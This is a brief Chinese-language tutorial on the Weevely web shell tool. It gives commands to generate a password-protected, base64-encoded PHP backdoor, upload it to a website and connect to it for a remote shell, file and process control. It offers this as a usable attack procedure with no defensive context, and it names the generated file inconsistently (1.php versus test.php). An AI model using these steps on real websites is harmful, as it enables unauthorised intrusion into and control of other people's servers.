#Weevely菜刀
---


使用Weevely?

 1、在Kali Linux终端输入weevely

 2、生成一个php后门，是base64加密的，存放路径可自行指定 格式：weevely generate 密码 路径 文件名 举例：weevely generate passwd /tmp/1.php 解析：生成一个名为test.php的后门，密码为passwd 

3、将此后门上传到网站，用weevely连接，连接后面直接跟上设置的密码【网站路径自行指定】 weevely http://192.168.179.137/doyo/test.php passwd 

4、连接webshell，会反弹一个shell终端，中文会乱码，可设置终端界面编码解决之。

5、进行控制操作，如查看系统信息，文件操作，进程操作等 6、同时weevely还支持多个模块使用，在连接上后门之后按Tab键，可以查看可利用的模块，工具很强大，大家自行研究！
